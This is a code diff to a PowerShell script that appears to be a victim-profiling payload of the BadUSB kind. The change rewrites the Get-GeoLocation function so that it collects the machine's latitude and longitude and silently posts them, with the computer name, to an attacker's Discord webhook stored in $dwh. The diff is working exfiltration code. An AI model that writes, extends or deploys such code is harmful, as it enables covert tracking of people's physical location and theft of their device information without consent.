@@ -72,27 +72,34 @@ $FN = Get-fullName
 
 function Get-GeoLocation{
 	try {
-	Add-Type -AssemblyName System.Device #Required to access System.Device.Location namespace
-	$GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher #Create the required object
-	$GeoWatcher.Start() #Begin resolving current locaton
+    Add-Type -AssemblyName System.Device
+    $GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher
+    $GeoWatcher.Start()
 
-	while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied')) {
-		Start-Sleep -Milliseconds 100 #Wait for discovery.
-	}  
+    while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied')) {
+        Start-Sleep -Milliseconds 100
+    }
 
-	if ($GeoWatcher.Permission -eq 'Denied'){
-		Write-Error 'Access Denied for Location Information'
-	} else {
-		$GeoWatcher.Position.Location | Select Latitude,Longitude #Select the relevant results.
-		
-	}
-	}
-    # Write Error is just for troubleshooting
-    catch {Write-Error "No coordinates found" 
-    return "No Coordinates found"
+    if ($GeoWatcher.Permission -eq 'Denied') {
+        Write-Error 'Access Denied for Location Information'
+    } else {
+        $location = $GeoWatcher.Position.Location
+        $latitude = $location.Latitude
+        $longitude = $location.Longitude
+        $coordinates = "$latitude,$longitude"
+
+        # Replace with your Discord webhook URL
+        $webhookUrl = $dwh
+        $body = @{
+            content = "Computer: $computerName`nCoordinates: $coordinates"
+        } | ConvertTo-Json
+
+        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $body -ContentType "application/json"
+    }
+} catch {
+    Write-Error 'No coordinates found'
+    return 'No Coordinates found'
     -ErrorAction SilentlyContinue
-    } 
-
 }
 
 #-----------------------------------------------------------------------------------------------------------------------------------------------------------
